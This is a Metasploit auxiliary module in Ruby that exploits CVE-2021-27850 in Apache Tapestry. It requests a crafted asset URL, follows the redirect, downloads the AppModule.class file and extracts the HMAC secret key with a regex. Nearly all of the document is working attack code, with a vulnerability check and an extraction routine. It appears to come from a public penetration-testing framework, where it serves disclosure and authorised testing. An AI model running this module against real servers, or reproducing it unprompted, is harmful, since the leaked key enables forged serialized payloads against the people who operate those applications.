##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tapestry HMAC secret key leak',
        'Description' => %q{
          This exploit finds the HMAC secret key used in Java serialization by Apache Tapestry. This key
          is located in the file AppModule.class by default and looks like the standard representation of UUID in hex digits (hd) :
          6hd-4hd-4hd-4hd-12hd
          If the HMAC key has been changed to look differently, this module won't find the key because it tries to download the file
          and then uses a specific regex to find the key.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Johannes Moritz', # CVE
          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
        ],
        'References' =>
          [
            [ 'CVE', '2021-27850']
          ],
        'DisclosureDate' => '2021-04-15'
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETED_CLASS', [true, 'Name of the targeted java class', 'AppModule.class']),
      OptString.new('TARGETURI', [true, 'The base path of the Apache Tapestry Server', '/'])
    ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', datastore['TARGETED_CLASS'], '/')
    })

    if res.nil?
      Exploit::CheckCode::Unknown
    elsif res.code == 302

      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/#{datastore['TARGETED_CLASS']}}, 1]
      normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', datastore['TARGETED_CLASS'], '/')
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalized_url
      })

      if res.code == 200 && res.headers['Content-Type'] == 'application/java'
        print_good('Java file leak at ' + rhost + ':' + rport.to_s + normalized_url)
        Exploit::CheckCode::Vulnerable
      else
        Exploit::CheckCode::Safe
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/' + datastore['TARGETED_CLASS'] + '/')
    })

    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/+#{datastore['TARGETED_CLASS']}}, 1]
    normalized_url = normalize_uri(target_uri.path, '/assets/app/' + id_url + '/services/' + datastore['TARGETED_CLASS'] + '/')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_url
    })

    raw_class_file = res.body.to_s
    secret_key = raw_class_file[/\w{8}-\w{4}-\w{4}-\w{4}-\w{12}/, 0]

    if secret_key.nil?
      print_fail('No secret key found')
    else
      print_good('Secret key found : ' + secret_key)
    end
  end
end
